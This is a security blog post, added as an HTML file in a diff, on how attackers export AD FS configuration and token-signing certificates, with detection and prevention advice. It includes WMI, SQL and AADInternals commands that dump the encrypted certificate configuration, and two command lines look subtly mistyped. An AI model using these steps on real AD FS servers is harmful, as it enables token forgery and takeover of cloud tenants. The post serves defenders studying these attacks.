@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="en-gb">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="cache-control" content="no-cache"> 
+<meta http-equiv="expires" content="0"> 
+<meta http-equiv="pragma" content="no-cache">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Exporting AD FS certificates revisited: Tactics, Techniques and Procedures</title>
+<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
+<meta name="generator" content="Hugo 0.39" />
+<meta property="og:title" content="Exporting AD FS certificates revisited: Tactics, Techniques and Procedures" />
+<meta property="og:description" content="I&rsquo;ve talked about AD FS issues for a couple years now, and finally, after the Solorigate/Sunburst, the world is finally listening 😉
+
+In this blog, I&rsquo;ll explain the currently known TTPs to exploit AD FS certificates, and introduce a totally new technique to export the configuration data remotely.
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://o365blog.com/post/adfs/" />
+
+
+
+<meta property="article:published_time" content="2021-04-27T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2022-09-09T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="dns-prefetch" href="//fonts.googleapis.com" />
+<link rel="dns-prefetch" href="//fonts.gstatic.com" />
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
+<script type="text/javascript" src="/js/scripts.js"></script>
+<script type="text/javascript" src="/js/tools.js"></script>
+
+<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
+<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
+<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
+<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
+<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
+<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
+<meta name="application-name" content="&nbsp;"/>
+<meta name="msapplication-TileColor" content="#FFFFFF" />
+<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
+<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
+<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
+<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
+<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-61454000-4', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+</head>
+<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+	<div class="container container-outer">
+		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
+		
+			<div class="container container-inner clearfix">
+			
+				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
+				
+					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
+						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
+						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
+					</a>
+				</div>
+			</div>
+			
+<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<ul class="menu__list">
+		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
+		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
+		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
+	</ul>
+</nav>
+
+		</header>
+		<div class="wrapper clearfix">
+
+<main class="main-content content" role="main" itemprop="mainContentOfPage">
+	<article class="post">
+		<header class="post__header clearfix">
+			<h1 class="post__title">Exporting AD FS certificates revisited: Tactics, Techniques and Procedures</h1>
+			<p class="post__meta meta">
+				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
+				<time class="post__meta-date" datetime="2021-04-27T00:00:00">April 27, 2021</time>
+					<time class="post__meta-lastmod" datetime="2022-09-09T00:00:00"> (Last Modified: September 09, 2022)</time>
+				<span class="post__meta-categories meta-categories">
+					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
+					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
+			</p>
+			<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fadfs%2f&text=Exporting%20AD%20FS%20certificates%20revisited%3a%20Tactics%2c%20Techniques%20and%20Procedures&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fadfs%2f&mini=true&title=Exporting%20AD%20FS%20certificates%20revisited%3a%20Tactics%2c%20Techniques%20and%20Procedures&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+		</header>
+		<div class="post__content clearfix">
+			<figure class="post__thumbnail">
+				<img src="/images/posts/ADFS.png" alt="Exporting AD FS certificates revisited: Tactics, Techniques and Procedures">
+			</figure>
+				<nav id="TableOfContents">
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#exporting-configuration">Exporting configuration</a>
+<ul>
+<li><a href="#local">Local</a>
+<ul>
+<li><a href="#access-config-database">Access config database</a></li>
+<li><a href="#detecting-access-to-config-database">Detecting access to config database</a></li>
+<li><a href="#preventing-access-to-config-database">Preventing access to config database</a></li>
+<li><a href="#net-reflection">.NET reflection</a></li>
+<li><a href="#detecting-and-preventing-net-reflection">Detecting and preventing .NET reflection</a></li>
+</ul></li>
+<li><a href="#remote-as-ad-fs-service-account">Remote as AD FS service account</a>
+<ul>
+<li><a href="#detecting">Detecting</a></li>
+<li><a href="#preventing">Preventing</a></li>
+</ul></li>
+<li><a href="#remote-as-any-user">Remote as any user</a>
+<ul>
+<li><a href="#detecting-1">Detecting</a></li>
+<li><a href="#preventing-1">Preventing</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#editing-policy-store-rules">Editing Policy Store Rules</a>
+<ul>
+<li><a href="#detecting-2">Detecting</a></li>
+<li><a href="#preventing-2">Preventing</a></li>
+</ul></li>
+<li><a href="#exporting-configuration-encryption-key">Exporting configuration encryption key</a>
+<ul>
+<li><a href="#local-net-reflection">Local (.NET reflection)</a>
+<ul>
+<li><a href="#detecting-3">Detecting</a></li>
+<li><a href="#preventing-3">Preventing</a></li>
+</ul></li>
+<li><a href="#remote">Remote</a>
+<ul>
+<li><a href="#detecting-4">Detecting</a></li>
+<li><a href="#preventing-4">Preventing</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#exporting-ad-fs-certificates">Exporting AD FS certificates</a></li>
+<li><a href="#exploiting">Exploiting</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+</nav>
+			<p>I&rsquo;ve talked about AD FS issues for a couple years now, and finally, after the Solorigate/Sunburst, the world is finally listening 😉</p>
+
+<p>In this blog, I&rsquo;ll explain the currently known TTPs to exploit AD FS certificates, and introduce a totally new technique to export the configuration data remotely.</p>
+
+<p></p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>I faced the first issues with the Office 365 / Azure AD identity federation in <a href="/post/federation-vulnerability/" target="_blank">2017</a>,
+when I found out that you could login in as any user of the tenant, regardless were they federated or not. The requirement was that the <strong>immutableId</strong> property
+of the user was known. The property would be populated automatically for all synced user, for non-synced user this is possible to set manually by admins.</p>
+
+<p>I also knew that it was possible to create SAML tokens to exploit this, as long I would have access token signing certificate. I also knew that the certificate
+was stored in the configuration database and encrypted with a key that was stored in AD. Regardless of the hours spent trying to solve the mystery, I just couldn&rsquo;t
+decrypt the certificate.</p>
+
+<p>But then came the <a href="https://troopers.de/troopers19/" target="_blank">TROOPERS19</a>, and the wonderful presentation <a href="https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you" target="_blank">I am AD FS and So Can You</a> by
+Douglas Bienstock (<a href="https://twitter.com/doughsec">@doughsec</a>) and Austin Baker (<a href="https://twitter.com/BakedSec">@BakedSec</a>). Their seminal research finally revealed how to decrypt AD FS certificates!
+The two famous tools were also introduced: <a href="https://github.com/fireeye/ADFSdump" target="_blank">ADFSDump</a> and <a href="https://github.com/fireeye/ADFSpoof" target="_blank">ADFSpoof</a>.</p>
+
+<p>For short, to export AD FS token signing certificate, two things are needed: AD FS configuration data and certificate encryption key.</p>
+
+<p>At late 2020, the world finally woke up after an attack against SolarWinds. The attack is better known as Solorigate or Sunburst, and among other things, it exploited the known AD FS issues to get access to SolarWinds&rsquo; customers
+Microsoft clouds. Since then, many providers (including Microsoft) have published a loads of material on how to detect such attacks and how to mitigate allready compromised environments.</p>
+
+<p>In this blog, I&rsquo;ll deep-dive in to TTPs these attacks used, how to detect them, and how to protect from future attacks (where applicable).</p>
+
+<p>AD FS certification export supports now all methods included in the <strong>AD FS attack graph</strong> I presented at <a href="https://troopers.de" target="_blank">TROOPERS</a> conference in June 2022 (presentation slide deck available <a href="/talks/Eight ways to compromise AD FS certificates.pdf">here</a>).</p>
+
+<p><img src="/images/posts/ADFS_12.png" alt="AD FS attack graph" /></p>
+
+<h1 id="exporting-configuration">Exporting configuration</h1>
+
+<p>Regardless of the deployment model, AD FS configuration is always stored to a database. For smaller environments, the Windows Internal Database (WID) is used, and Microsoft SQL for larger ones.</p>
+
+<p>The actual configuration is an xml file, including all the settings of the AD FS service. The xml file has over 1000 lines, below is an exerpt with the interesting data.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="ln"> 1</span><span class="nt">&lt;ServiceSettingsData</span> <span class="na">xmlns:i=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.datacontract.org/2012/04/ADFS&#34;</span><span class="nt">&gt;</span>
+<span class="ln"> 2</span>	<span class="nt">&lt;SecurityTokenService&gt;</span>
+<span class="ln"> 3</span>		<span class="nt">&lt;AdditionalEncryptionTokens&gt;</span>
+<span class="ln"> 4</span>			<span class="nt">&lt;CertificateReference&gt;</span>
+<span class="ln"> 5</span>				<span class="nt">&lt;IsChainIncluded&gt;</span>false<span class="nt">&lt;/IsChainIncluded&gt;</span>
+<span class="ln"> 6</span>				<span class="nt">&lt;IsChainIncludedSpecified&gt;</span>false<span class="nt">&lt;/IsChainIncludedSpecified&gt;</span>
+<span class="ln"> 7</span>				<span class="nt">&lt;FindValue&gt;</span>B7C09D5C2F434A2B746D200946202DE273A4B68C<span class="nt">&lt;/FindValue&gt;</span>
+<span class="ln"> 8</span>				<span class="nt">&lt;RawCertificate&gt;</span>MII[redacted]+RAh7dEypFVmcIyCd<span class="nt">&lt;/RawCertificate&gt;</span>
+<span class="hl"><span class="ln"> 9</span>				<span class="nt">&lt;EncryptedPfx&gt;</span>AAAAA[redacted]Dbb5/gJLkQ==<span class="nt">&lt;/EncryptedPfx&gt;</span>
+</span><span class="ln">10</span>				<span class="nt">&lt;StoreNameValue&gt;</span>My<span class="nt">&lt;/StoreNameValue&gt;</span>
+<span class="ln">11</span>				<span class="nt">&lt;StoreLocationValue&gt;</span>CurrentUser<span class="nt">&lt;/StoreLocationValue&gt;</span>
+<span class="ln">12</span>				<span class="nt">&lt;X509FindTypeValue&gt;</span>FindByThumbprint<span class="nt">&lt;/X509FindTypeValue&gt;</span>
+<span class="ln">13</span>			<span class="nt">&lt;/CertificateReference&gt;</span>
+<span class="ln">14</span>		<span class="nt">&lt;/AdditionalEncryptionTokens&gt;</span>
+<span class="ln">15</span>		<span class="nt">&lt;AdditionalSigningTokens&gt;</span>
+<span class="ln">16</span>			<span class="nt">&lt;CertificateReference&gt;</span>
+<span class="ln">17</span>				<span class="nt">&lt;IsChainIncluded&gt;</span>false<span class="nt">&lt;/IsChainIncluded&gt;</span>
+<span class="ln">18</span>				<span class="nt">&lt;IsChainIncludedSpecified&gt;</span>false<span class="nt">&lt;/IsChainIncludedSpecified&gt;</span>
+<span class="ln">19</span>				<span class="nt">&lt;FindValue&gt;</span>6FFF3A436D13EB299549F2BA93D485CBD050EB4F<span class="nt">&lt;/FindValue&gt;</span>
+<span class="ln">20</span>				<span class="nt">&lt;RawCertificate&gt;</span>MII[redacted]OzFUGmGWPXqLk<span class="nt">&lt;/RawCertificate&gt;</span>
+<span class="hl"><span class="ln">21</span>				<span class="nt">&lt;EncryptedPfx&gt;</span>AAAAA[redacted]+evM94M17iG9P6VDFrA==<span class="nt">&lt;/EncryptedPfx&gt;</span>
+</span><span class="ln">22</span>				<span class="nt">&lt;StoreNameValue&gt;</span>My<span class="nt">&lt;/StoreNameValue&gt;</span>
+<span class="ln">23</span>				<span class="nt">&lt;StoreLocationValue&gt;</span>CurrentUser<span class="nt">&lt;/StoreLocationValue&gt;</span>
+<span class="ln">24</span>				<span class="nt">&lt;X509FindTypeValue&gt;</span>FindByThumbprint<span class="nt">&lt;/X509FindTypeValue&gt;</span>
+<span class="ln">25</span>			<span class="nt">&lt;/CertificateReference&gt;</span>
+<span class="ln">26</span>		<span class="nt">&lt;/AdditionalSigningTokens&gt;</span>
+<span class="ln">27</span>		<span class="nt">&lt;EncryptionToken&gt;</span>
+<span class="ln">28</span>			<span class="nt">&lt;IsChainIncluded&gt;</span>false<span class="nt">&lt;/IsChainIncluded&gt;</span>
+<span class="ln">29</span>			<span class="nt">&lt;IsChainIncludedSpecified&gt;</span>false<span class="nt">&lt;/IsChainIncludedSpecified&gt;</span>
+<span class="ln">30</span>			<span class="nt">&lt;FindValue&gt;</span>B7C09D5C2F434A2B746D200946202DE273A4B68C<span class="nt">&lt;/FindValue&gt;</span>
+<span class="ln">31</span>			<span class="nt">&lt;RawCertificate&gt;</span>MII[redacted]+RAh7dEypFVmcIyCd<span class="nt">&lt;/RawCertificate&gt;</span>
+<span class="hl"><span class="ln">32</span>			<span class="nt">&lt;EncryptedPfx&gt;</span>AAAAA[redacted]Dbb5/gJLkQ==<span class="nt">&lt;/EncryptedPfx&gt;</span>
+</span><span class="ln">33</span>			<span class="nt">&lt;StoreNameValue&gt;</span>My<span class="nt">&lt;/StoreNameValue&gt;</span>
+<span class="ln">34</span>			<span class="nt">&lt;StoreLocationValue&gt;</span>CurrentUser<span class="nt">&lt;/StoreLocationValue&gt;</span>
+<span class="ln">35</span>			<span class="nt">&lt;X509FindTypeValue&gt;</span>FindByThumbprint<span class="nt">&lt;/X509FindTypeValue&gt;</span>
+<span class="ln">36</span>		<span class="nt">&lt;/EncryptionToken&gt;</span>
+<span class="ln">37</span>		<span class="nt">&lt;SigningToken&gt;</span>
+<span class="ln">38</span>			<span class="nt">&lt;IsChainIncluded&gt;</span>false<span class="nt">&lt;/IsChainIncluded&gt;</span>
+<span class="ln">39</span>			<span class="nt">&lt;IsChainIncludedSpecified&gt;</span>false<span class="nt">&lt;/IsChainIncludedSpecified&gt;</span>
+<span class="ln">40</span>			<span class="nt">&lt;FindValue&gt;</span>6FFF3A436D13EB299549F2BA93D485CBD050EB4F<span class="nt">&lt;/FindValue&gt;</span>
+<span class="ln">41</span>			<span class="nt">&lt;RawCertificate&gt;</span>MII[redacted]OzFUGmGWPXqLk<span class="nt">&lt;/RawCertificate&gt;</span>
+<span class="hl"><span class="ln">42</span>			<span class="nt">&lt;EncryptedPfx&gt;</span>AAAAA[redacted]+evM94M17iG9P6VDFrA==<span class="nt">&lt;/EncryptedPfx&gt;</span>
+</span><span class="ln">43</span>			<span class="nt">&lt;StoreNameValue&gt;</span>My<span class="nt">&lt;/StoreNameValue&gt;</span>
+<span class="ln">44</span>			<span class="nt">&lt;StoreLocationValue&gt;</span>CurrentUser<span class="nt">&lt;/StoreLocationValue&gt;</span>
+<span class="ln">45</span>			<span class="nt">&lt;X509FindTypeValue&gt;</span>FindByThumbprint<span class="nt">&lt;/X509FindTypeValue&gt;</span>
+<span class="ln">46</span>		<span class="nt">&lt;/SigningToken&gt;</span>
+<span class="ln">47</span>	<span class="nt">&lt;/SecurityTokenService&gt;</span>
+<span class="ln">48</span>	<span class="nt">&lt;PolicyStore&gt;</span>
+<span class="ln">49</span>		<span class="nt">&lt;AuthorizationPolicy&gt;</span>@RuleName = &#34;Permit Service Account&#34;
+<span class="ln">50</span>exists([Type == &#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid&#34;, Value == &#34;S-1-5-21-2918793985-2280761178-2512057791-1134&#34;])
+<span class="ln">51</span> =<span class="ni">&amp;gt;</span> issue(Type = &#34;http://schemas.microsoft.com/authorization/claims/permit&#34;, Value = &#34;true&#34;);
+<span class="ln">52</span>
+<span class="ln">53</span>@RuleName = &#34;Permit Local Administrators&#34;
+<span class="ln">54</span>exists([Type == &#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid&#34;, Value == &#34;S-1-5-32-544&#34;])
+<span class="ln">55</span> =<span class="ni">&amp;gt;</span> issue(Type = &#34;http://schemas.microsoft.com/authorization/claims/permit&#34;, Value = &#34;true&#34;);
+<span class="ln">56</span>
+<span class="ln">57</span>		<span class="nt">&lt;/AuthorizationPolicy&gt;</span>
+<span class="ln">58</span>		<span class="nt">&lt;AuthorizationPolicyReadOnly&gt;</span>@RuleName = &#34;Permit Service Account&#34;
+<span class="ln">59</span>exists([Type == &#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid&#34;, Value == &#34;S-1-5-21-2918793985-2280761178-2512057791-1134&#34;])
+<span class="ln">60</span> =<span class="ni">&amp;gt;</span> issue(Type = &#34;http://schemas.microsoft.com/authorization/claims/permit&#34;, Value = &#34;true&#34;);
+<span class="ln">61</span>
+<span class="ln">62</span>@RuleName = &#34;Permit Local Administrators&#34;
+<span class="ln">63</span>exists([Type == &#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid&#34;, Value == &#34;S-1-5-32-544&#34;])
+<span class="ln">64</span> =<span class="ni">&amp;gt;</span> issue(Type = &#34;http://schemas.microsoft.com/authorization/claims/permit&#34;, Value = &#34;true&#34;);
+<span class="ln">65</span>
+<span class="ln">66</span>		<span class="nt">&lt;/AuthorizationPolicyReadOnly&gt;</span>
+<span class="ln">67</span>		<span class="nt">&lt;DkmSettings&gt;</span>
+<span class="hl"><span class="ln">68</span>			<span class="nt">&lt;Group&gt;</span>87f0e958-be86-4c39-b469-ac94b5924bd2<span class="nt">&lt;/Group&gt;</span>
+</span><span class="hl"><span class="ln">69</span>			<span class="nt">&lt;ContainerName&gt;</span>CN=ADFS<span class="nt">&lt;/ContainerName&gt;</span>
+</span><span class="hl"><span class="ln">70</span>			<span class="nt">&lt;ParentContainerDn&gt;</span>CN=Microsoft,CN=Program Data,DC=aadinternals,DC=com<span class="nt">&lt;/ParentContainerDn&gt;</span>
+</span><span class="ln">71</span>			<span class="nt">&lt;PreferredReplica</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span> <span class="nt">/&gt;</span>
+<span class="ln">72</span>			<span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span>
+<span class="ln">73</span>		<span class="nt">&lt;/DkmSettings&gt;</span>
+<span class="ln">74</span>	<span class="nt">&lt;/PolicyStore&gt;</span>
+<span class="ln">75</span><span class="nt">&lt;/ServiceSettingsData&gt;</span></code></pre></div>
+
+<h2 id="local">Local</h2>
+
+<h3 id="access-config-database">Access config database</h3>
+
+<p>This scenario requires a local admin rights to AD FS server, and that WID is used to store configuration data. In this scenario, there is one Primary AD FS node, and one or more Secondary AD FS nodes.
+All the management must be done in the primary node, from where all the secondary nodes will fetch the configuration once in five minutes:</p>
+
+<p><img src="/images/posts/ADFS_01.png" alt="AD FS with WID" /></p>
+
+<p>The configuration can be exported from any AD FS server of the farm, regardless are they primary or secondary nodes.</p>
+
+<p>Technically, the export is performed by executing a SQL query against the WID:</p>
+
+<p><img src="/images/posts/ADFS_02.png" alt="AD FS with WID" /></p>
+
+<p>The database connection string can be queried using WMI:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">/</span><span class="n">AD</span> <span class="n">FS</span> <span class="n">-Class</span> <span class="n">SecurityTokenService</span><span class="p">).</span><span class="n">ConfigurationDatabaseConnectionString</span></code></pre></div>
+For Windows Server 2019 AD FS the connection string is:</p>
+
+<pre><code>Data Source=np:\\.\pipe\microsoft##wid\tsql\query;Initial Catalog=ADFSConfigurationV4;Integrated Security=True
+</code></pre>
+
+<p>The actual configuration data can now be fetched with the following SQL query:
+<div class="highlight"><pre class="chroma"><code class="language-SQL" data-lang="SQL"><span class="k">SELECT</span> <span class="n">ServiceSettingsData</span> <span class="k">from</span> <span class="n">IdentityServerPolicy</span><span class="p">.</span><span class="n">ServiceSettings</span></code></pre></div></p>
+
+<p>To export the configuration with AADInternals:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Export configuration and store to variable</span>
+<span class="nv">$ADFSConfig</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSConfiguration</span> <span class="n">-Local</span></code></pre></div></p>
+
+<p>Or, to save it to a file:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Export configuration to file</span>
+<span class="nb">Export-AADIntAD</span> <span class="n">SConfiguration</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">ADFSConfig</span><span class="p">.</span><span class="n">xml</span> <span class="n">-Encoding</span> <span class="n">UTF8</span></code></pre></div></p>
+
+<p>Another technique requiring access to AD FS server would be to download the configuration database from a remote computer same way as Dirk-Jan Mollena (<a href="https://twitter.com/_dirkjan" target="_blank">@_dirkjan</a>) does with his <a href="https://github.com/fox-it/adconnectdump" target="_blank">adconnectdump</a> tool.
+However, AFAIK, this has not implemented yet.</p>
+
+<h3 id="detecting-access-to-config-database">Detecting access to config database</h3>
+
+<p>Exploiting this scenario requires logging in to AD FS server. As such, the exploitation can be detected by:</p>
+
+<ul>
+<li>Monitoring the Security log for the suspicious logons</li>
+<li>Enabling audit logging in WID for ServiceSettings queries and monitoring for suspicious access</li>
+</ul>
+
+<p>To enable AD FS audit logging, connect to WID database by SQL Management Studio or <strong>sqlcmd</strong> using database information from connection string above:</p>
+
+<pre><code>sqlcmd -S \\.\pipe\microsoft##wid\tsql\query
+</code></pre>
+
+<p>The following SQL query will enable logging for all SELECT statements against ServiceSettings table.
+The server level auditing created in row 3 is attached to <strong>Application Log</strong> and enabled in row 5. In row 7, use the correct database name from the connection string above (depends on the AD FS version).
+The database level auditing is defined in row 9 to include all SELECT statements against ServiceSettings table, and enabled in row 11.
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">USE</span> <span class="p">[</span><span class="n">master</span><span class="p">]</span>
+<span class="k">GO</span>
+<span class="k">CREATE</span> <span class="n">SERVER</span> <span class="n">AUDIT</span> <span class="p">[</span><span class="n">ADFS_AUDIT_APPLICATION_LOG</span><span class="p">]</span> <span class="k">TO</span> <span class="n">APPLICATION_LOG</span> <span class="k">WITH</span> <span class="p">(</span><span class="n">QUEUE_DELAY</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">ON_FAILURE</span> <span class="o">=</span> <span class="k">CONTINUE</span><span class="p">)</span>
+<span class="k">GO</span>
+<span class="k">ALTER</span> <span class="n">SERVER</span> <span class="n">AUDIT</span> <span class="p">[</span><span class="n">ADFS_AUDIT_APPLICATION_LOG</span><span class="p">]</span> <span class="k">WITH</span> <span class="p">(</span><span class="k">STATE</span> <span class="o">=</span> <span class="k">ON</span><span class="p">)</span>
+<span class="k">GO</span>
+<span class="hl"><span class="n">USE</span> <span class="p">[</span><span class="n">ADFSConfigurationV4</span><span class="p">]</span>
+</span><span class="k">GO</span>
+<span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">AUDIT</span> <span class="n">SPECIFICATION</span> <span class="p">[</span><span class="n">ADFS_SETTINGS_ACCESS_AUDIT</span><span class="p">]</span> <span class="k">FOR</span> <span class="n">SERVER</span> <span class="n">AUDIT</span> <span class="p">[</span><span class="n">ADFS_AUDIT_APPLICATION_LOG</span><span class="p">]</span> <span class="k">ADD</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">ON</span> <span class="k">OBJECT</span><span class="p">::[</span><span class="n">IdentityServerPolicy</span><span class="p">].[</span><span class="n">ServiceSettings</span><span class="p">]</span> <span class="k">BY</span> <span class="p">[</span><span class="k">public</span><span class="p">])</span>
+<span class="k">GO</span>
+<span class="k">ALTER</span> <span class="k">DATABASE</span> <span class="n">AUDIT</span> <span class="n">SPECIFICATION</span> <span class="p">[</span><span class="n">ADFS_SETTINGS_ACCESS_AUDIT</span><span class="p">]</span> <span class="k">WITH</span> <span class="p">(</span><span class="k">STATE</span> <span class="o">=</span> <span class="k">ON</span><span class="p">)</span>
+<span class="k">GO</span></code></pre></div></p>
+
+<p>As a result, all queries for ServiceSettings are now logged to Application log with <strong>event id 33205</strong>. If the <strong>server_principal_name</strong> is not the AD FS service user, the alert should be raised.</p>
+
+<p><img src="/images/posts/ADFS_03.png" alt="AD FS with WID" /></p>
+
+<p>The server level auditing will generate some extra log events, but database level audit should only include the local exports.</p>
+
+<h3 id="preventing-access-to-config-database">Preventing access to config database</h3>
+
+<p>Dumping databases locally can not be fully prevented, but the limiting access to a minimum would reduce the attack surface.</p>
+
+<h3 id="net-reflection">.NET reflection</h3>
+
+<p>This technique also requires a local admin rights to AD FS server. Basic idea is to run a legit <a href="https://docs.microsoft.com/en-us/powershell/module/adfs/get-adfsproperties" target="_blank">Get&#8209;AdfsProperties</a> command and
+get the configuration using .NET reflection. This technique was introduced in Microsoft&rsquo;s <a href="https://github.com/microsoft/adfsToolbox" target="_blank">ADFSToolbox</a>.
+ADFSToolbox contains tools &ldquo;for helping you manage your AD FS farm&rdquo;.</p>
+
+<p>The source code of <a href="https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208">Test.ServiceAccount.ps1</a> file shows the following:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-PowerShell" data-lang="PowerShell"><span class="ln">199</span><span class="c"># Gets internal ADFS settings by extracting them Get-AdfsProperties</span>
+<span class="ln">200</span><span class="k">function</span> <span class="nb">Get-AdfsInternalSettings</span><span class="p">()</span>
+<span class="ln">201</span><span class="p">{</span>
+<span class="ln">202</span>    <span class="nv">$settings</span> <span class="p">=</span> <span class="nb">Get-AdfsProperties</span>
+<span class="ln">203</span>    <span class="nv">$settingsType</span> <span class="p">=</span> <span class="nv">$settings</span><span class="p">.</span><span class="n">GetType</span><span class="p">()</span>
+<span class="ln">204</span>    <span class="nv">$propInfo</span> <span class="p">=</span> <span class="nv">$settingsType</span><span class="p">.</span><span class="n">GetProperty</span><span class="p">(</span><span class="s2">&#34;ServiceSettingsData&#34;</span><span class="p">,</span> <span class="no">[System.Reflection.BindingFlags]</span><span class="p">::</span><span class="n">Instance</span> <span class="o">-bor</span> <span class="no">[System.Reflection.BindingFlags]</span><span class="p">::</span><span class="n">NonPublic</span><span class="p">)</span>
+<span class="ln">205</span>    <span class="nv">$internalSettings</span> <span class="p">=</span> <span class="nv">$propInfo</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="nv">$settings</span><span class="p">,</span> <span class="nv">$null</span><span class="p">)</span>
+<span class="ln">206</span>    
+<span class="ln">207</span>    <span class="k">return</span> <span class="nv">$internalSettings</span>
+<span class="ln">208</span><span class="p">}</span></code></pre></div>
+
